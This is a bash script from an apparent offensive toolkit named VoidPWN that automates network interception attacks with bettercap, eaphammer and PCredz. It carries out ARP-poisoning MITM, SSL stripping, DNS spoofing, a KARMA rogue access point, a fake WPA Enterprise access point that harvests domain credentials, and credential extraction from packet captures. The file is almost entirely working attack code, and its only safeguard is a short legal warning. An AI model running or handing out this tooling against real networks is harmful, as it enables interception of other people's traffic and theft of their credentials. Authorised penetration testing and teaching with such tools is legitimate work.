#!/bin/bash

################################################################################
# VoidPWN - MITM & Credential Intercept Toolkit
# Description: Bettercap MITM, SSL stripping, DNS spoofing, KARMA rogue AP,
#              WPA Enterprise credential harvesting, and pcap credential parsing
# Usage: sudo ./mitm_tools.sh [options]
################################################################################

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Directories — resolve project root dynamically from SCRIPT_DIR
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$(dirname "$SCRIPT_DIR")")"
OUTPUT_DIR="$PROJECT_ROOT/output/captures"
LOGS_DIR="$PROJECT_ROOT/output/logs"

mkdir -p "$OUTPUT_DIR" "$LOGS_DIR"

log_info()    { echo -e "${BLUE}[*]${NC} $1"; }
log_success() { echo -e "${GREEN}[✓]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error()   { echo -e "${RED}[✗]${NC} $1"; }

# Check root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be run as root (use sudo)"
        exit 1
    fi
}

# Auto-detect primary network interface (wl* first, then eth/en)
detect_interface() {
    local ifaces
    ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}')
    if [[ -z "$ifaces" ]]; then
        ifaces=$(ip link show 2>/dev/null | awk -F': ' '/^[0-9]+: wl/{print $2}')
    fi
    if [[ -n "$ifaces" ]]; then
        local preferred
        preferred=$(echo "$ifaces" | grep -v '^wlan0$' | head -n 1)
        echo "${preferred:-$(echo "$ifaces" | head -n 1)}"
        return 0
    fi
    # Fallback to any active non-loopback interface
    ip route 2>/dev/null | awk '/default/{print $5; exit}'
}

# Detect active ethernet/wired interface
detect_eth_interface() {
    ip route 2>/dev/null | awk '/default/{print $5; exit}'
}

# Enable IP forwarding
enable_ip_forward() {
    local old
    old=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null)
    echo 1 > /proc/sys/net/ipv4/ip_forward
    log_info "IP forwarding enabled (was: $old)"
}

# Restore IP forwarding state
disable_ip_forward() {
    echo 0 > /proc/sys/net/ipv4/ip_forward
    log_info "IP forwarding disabled"
}

################################################################################
# ATTACK 1: Bettercap full MITM (ARP poison + credential sniff)
################################################################################
bettercap_mitm() {
    local interface="$1"
    local target="$2"

    if ! command -v bettercap &>/dev/null; then
        log_error "bettercap not found. Install with: sudo apt install bettercap"
        exit 1
    fi

    [[ -z "$interface" ]] && interface=$(detect_interface)
    if [[ -z "$interface" ]]; then
        log_error "No wireless/network interface detected"
        exit 1
    fi

    local timestamp
    timestamp=$(date +%Y%m%d_%H%M%S)
    local log_file="$OUTPUT_DIR/mitm_${timestamp}.txt"

    enable_ip_forward

    log_info "Starting Bettercap MITM on interface: $interface"
    [[ -n "$target" ]] && log_info "Targeting: $target" || log_info "Targeting: full subnet (broadcast)"

    local caplet
    if [[ -n "$target" ]]; then
        caplet="net.probe on; arp.spoof.targets $target; arp.spoof on; net.sniff on"
    else
        caplet="net.probe on; arp.spoof on; net.sniff on"
    fi

    log_warning "Press Ctrl+C to stop MITM and restore ARP tables"
    bettercap -iface "$interface" -eval "$caplet" 2>&1 | tee "$log_file"

    disable_ip_forward
    log_success "MITM session ended. Output saved to: $log_file"
}

################################################################################
# ATTACK 2: SSL Strip via Bettercap HTTP proxy + HSTS hijack
################################################################################
bettercap_sslstrip() {
    local interface="$1"
    local target="$2"

    if ! command -v bettercap &>/dev/null; then
        log_error "bettercap not found. Install with: sudo apt install bettercap"
        exit 1
    fi

    [[ -z "$interface" ]] && interface=$(detect_interface)
    if [[ -z "$interface" ]]; then
        log_error "No network interface detected"
        exit 1
    fi

    local timestamp
    timestamp=$(date +%Y%m%d_%H%M%S)
    local log_file="$OUTPUT_DIR/sslstrip_${timestamp}.txt"

    enable_ip_forward

    log_info "Starting SSL Strip on interface: $interface"
    [[ -n "$target" ]] && log_info "Targeting: $target" || log_info "Targeting: full subnet"

    local arp_part="arp.spoof on"
    [[ -n "$target" ]] && arp_part="arp.spoof.targets $target; arp.spoof on"

    # Try hstshijack caplet first; fall back to bare http.proxy
    local hstshijack_caplet
    hstshijack_caplet=$(find /usr/share/bettercap -name "hstshijack.cap" 2>/dev/null | head -n 1)
    hstshijack_caplet="${hstshijack_caplet:-$(find /root/.bettercap -name "hstshijack.cap" 2>/dev/null | head -n 1)}"

    local caplet
    if [[ -n "$hstshijack_caplet" ]]; then
        log_info "Using hstshijack caplet: $hstshijack_caplet"
        caplet="net.probe on; $arp_part; caplets.show; include $hstshijack_caplet"
    else
        log_warning "hstshijack caplet not found — using bare http.proxy (weaker SSL strip)"
        caplet="net.probe on; $arp_part; http.proxy on; net.sniff on"
    fi

    log_warning "Press Ctrl+C to stop and restore ARP tables"
    bettercap -iface "$interface" -eval "$caplet" 2>&1 | tee "$log_file"

    disable_ip_forward
    log_success "SSL Strip session ended. Output saved to: $log_file"
}

################################################################################
# ATTACK 3: DNS Spoofing via Bettercap
################################################################################
bettercap_dns_spoof() {
    local interface="$1"
    local domain="$2"
    local redirect_ip="$3"

    if ! command -v bettercap &>/dev/null; then
        log_error "bettercap not found. Install with: sudo apt install bettercap"
        exit 1
    fi

    if [[ -z "$domain" || -z "$redirect_ip" ]]; then
        log_error "Usage: $0 --dnsspoof --domain <DOMAIN> --redirect <IP> [--interface <IFACE>]"
        exit 1
    fi

    [[ -z "$interface" ]] && interface=$(detect_interface)
    if [[ -z "$interface" ]]; then
        log_error "No network interface detected"
        exit 1
    fi

    local timestamp
    timestamp=$(date +%Y%m%d_%H%M%S)
    local log_file="$OUTPUT_DIR/dnsspoof_${timestamp}.txt"

    enable_ip_forward

    log_info "Starting DNS Spoof on interface: $interface"
    log_info "Spoofing: $domain → $redirect_ip"

    local caplet="net.probe on; arp.spoof on; dns.spoof.domains $domain; dns.spoof.address $redirect_ip; dns.spoof on; net.sniff on"

    log_warning "Press Ctrl+C to stop and restore ARP/DNS"
    bettercap -iface "$interface" -eval "$caplet" 2>&1 | tee "$log_file"

    disable_ip_forward
    log_success "DNS Spoof session ended. Output saved to: $log_file"
}

################################################################################
# ATTACK 4: KARMA Rogue AP — respond to any SSID probe
################################################################################
karma_attack() {
    local interface="$1"

    if ! command -v bettercap &>/dev/null; then
        log_error "bettercap not found. Install with: sudo apt install bettercap"
        exit 1
    fi

    [[ -z "$interface" ]] && interface=$(detect_interface)
    if [[ -z "$interface" ]]; then
        log_error "No wireless interface detected"
        exit 1
    fi

    local timestamp
    timestamp=$(date +%Y%m%d_%H%M%S)
    local log_file="$OUTPUT_DIR/karma_${timestamp}.txt"

    log_info "Starting KARMA rogue AP on interface: $interface"
    log_info "Device will auto-associate to any probe request"
    log_warning "Ensure interface is NOT in monitor mode (KARMA uses managed mode)"
    log_warning "Press Ctrl+C to stop"

    # Use bettercap wifi module to respond to all probes
    bettercap -iface "$interface" -eval "wifi.recon on; wifi.ap on; net.sniff on" 2>&1 | tee "$log_file"

    log_success "KARMA session ended. Output saved to: $log_file"
}

################################################################################
# ATTACK 5: WPA Enterprise rogue AP via eaphammer
################################################################################
eaphammer_enterprise() {
    local interface="$1"
    local ssid="$2"

    if [[ ! -d /opt/eaphammer ]]; then
        log_error "eaphammer not found at /opt/eaphammer"
        log_error "Install with: sudo scripts/core/build_voidpwn.sh  (or git clone manually)"
        exit 1
    fi

    if [[ ! -x /opt/eaphammer/eaphammer ]]; then
        chmod +x /opt/eaphammer/eaphammer
    fi

    [[ -z "$interface" ]] && interface=$(detect_interface)
    if [[ -z "$interface" ]]; then
        log_error "No wireless interface detected"
        exit 1
    fi

    local timestamp
    timestamp=$(date +%Y%m%d_%H%M%S)
    local log_file="$OUTPUT_DIR/enterprise_${timestamp}.txt"

    [[ -z "$ssid" ]] && ssid="Corporate-WiFi"

    log_info "Launching WPA Enterprise rogue AP"
    log_info "Interface : $interface"
    log_info "SSID      : $ssid"
    log_warning "Captures MSCHAPV2 / PEAP credentials from domain-joined clients"
    log_warning "Press Ctrl+C to stop"

    cd /opt/eaphammer || exit 1
    ./eaphammer -i "$interface" --essid "$ssid" --creds --negotiate balanced 2>&1 | tee "$log_file"

    log_success "Enterprise AP session ended. Output saved to: $log_file"
}

################################################################################
# ATTACK 6: Parse credentials from captured .cap/.pcap files via PCredz
################################################################################
pcredz_analyze() {
    local cap_file="$1"

    if [[ ! -d /opt/pcredz ]]; then
        log_error "PCredz not found at /opt/pcredz"
        log_error "Install with: sudo scripts/core/build_voidpwn.sh  (or git clone manually)"
        exit 1
    fi

    if [[ ! -f /opt/pcredz/Pcredz.py ]]; then
        log_error "/opt/pcredz/Pcredz.py not found"
        exit 1
    fi

    local timestamp
    timestamp=$(date +%Y%m%d_%H%M%S)
    local out_file="$OUTPUT_DIR/pcredz_${timestamp}.txt"

    if [[ -n "$cap_file" ]]; then
        if [[ ! -f "$cap_file" ]]; then
            log_error "Capture file not found: $cap_file"
            exit 1
        fi
        log_info "Analyzing single capture: $cap_file"
        python3 /opt/pcredz/Pcredz.py -f "$cap_file" 2>&1 | tee "$out_file"
    else
        # Find most recent capture file in OUTPUT_DIR
        local latest
        latest=$(find "$OUTPUT_DIR" -maxdepth 1 \( -name "*.cap" -o -name "*.pcap" -o -name "*.pcapng" \) \
            -newer /proc/1 2>/dev/null | sort -t_ -k2,2r | head -n 1)
        # Fallback: most recently modified
        [[ -z "$latest" ]] && latest=$(find "$OUTPUT_DIR" -maxdepth 1 \
            \( -name "*.cap" -o -name "*.pcap" -o -name "*.pcapng" \) \
            -printf "%T@ %p\n" 2>/dev/null | sort -rn | awk 'NR==1{print $2}')

        if [[ -z "$latest" ]]; then
            log_error "No .cap/.pcap/.pcapng files found in $OUTPUT_DIR"
            log_info "Run a capture first (Handshake, PMKID, or Bettercap MITM)"
            exit 1
        fi

        log_info "No file specified — using latest capture: $latest"
        python3 /opt/pcredz/Pcredz.py -f "$latest" 2>&1 | tee "$out_file"
    fi

    if [[ -s "$out_file" ]]; then
        log_success "Credential analysis complete. Results saved to: $out_file"
    else
        log_warning "No credentials extracted (file may be empty or no plaintext protocols found)"
    fi
}

################################################################################
# Help
################################################################################
show_help() {
    cat << EOF
${CYAN}VoidPWN MITM & Credential Intercept Toolkit${NC}

${YELLOW}Usage:${NC}
  sudo $0 [OPTION] [FLAGS]

${YELLOW}Options:${NC}
  --bettercap               Full MITM: ARP poison + credential sniff
  --sslstrip                MITM + SSL strip via hstshijack/http.proxy
  --dnsspoof                DNS spoofing (requires --domain and --redirect)
  --karma                   KARMA rogue AP (respond to all SSID probes)
  --eaphammer               WPA Enterprise rogue AP (harvest MSCHAPV2 creds)
  --pcredz                  Parse credentials from .cap/.pcap captures
  --help                    Show this help

${YELLOW}Common Flags:${NC}
  --interface <IFACE>       Network interface to use (auto-detected if omitted)
  --target <IP>             Optional target IP for MITM attacks
  --domain <DOMAIN>         Domain to spoof (required for --dnsspoof)
  --redirect <IP>           IP to redirect spoofed domain to (required for --dnsspoof)
  --ssid <SSID>             SSID for Enterprise AP (default: Corporate-WiFi)
  --file <PATH>             Specific .cap file for --pcredz (uses latest if omitted)

${YELLOW}Examples:${NC}
  sudo $0 --bettercap
  sudo $0 --bettercap --interface wlan0 --target 192.168.1.50
  sudo $0 --sslstrip --target 192.168.1.50
  sudo $0 --dnsspoof --domain google.com --redirect 192.168.1.1
  sudo $0 --karma --interface wlan1
  sudo $0 --eaphammer --ssid "CorpNet" --interface wlan1
  sudo $0 --pcredz
  sudo $0 --pcredz --file ~/VoidPWN/output/captures/handshake_20251218.cap

${YELLOW}Output Directory:${NC}
  $OUTPUT_DIR

${RED}Legal Warning:${NC}
  Only test networks you own or have explicit written permission to test.
  Unauthorized interception is illegal under computer fraud laws.

EOF
}

################################################################################
# Main
################################################################################
main() {
    check_root

    local cmd=""
    local interface=""
    local target=""
    local domain=""
    local redirect=""
    local ssid=""
    local cap_file=""

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --bettercap)   cmd="bettercap" ;;
            --sslstrip)    cmd="sslstrip" ;;
            --dnsspoof)    cmd="dnsspoof" ;;
            --karma)       cmd="karma" ;;
            --eaphammer)   cmd="eaphammer" ;;
            --pcredz)      cmd="pcredz" ;;
            --interface)   interface="$2"; shift ;;
            --target)      target="$2"; shift ;;
            --domain)      domain="$2"; shift ;;
            --redirect)    redirect="$2"; shift ;;
            --ssid)        ssid="$2"; shift ;;
            --file)        cap_file="$2"; shift ;;
            --help|*)      show_help; exit 0 ;;
        esac
        shift
    done

    case "$cmd" in
        bettercap)  bettercap_mitm "$interface" "$target" ;;
        sslstrip)   bettercap_sslstrip "$interface" "$target" ;;
        dnsspoof)   bettercap_dns_spoof "$interface" "$domain" "$redirect" ;;
        karma)      karma_attack "$interface" ;;
        eaphammer)  eaphammer_enterprise "$interface" "$ssid" ;;
        pcredz)     pcredz_analyze "$cap_file" ;;
        *)          show_help ;;
    esac
}

# Cleanup on interrupt
trap 'log_warning "Interrupted — restoring IP forwarding"; disable_ip_forward 2>/dev/null; exit 1' INT TERM

main "$@"
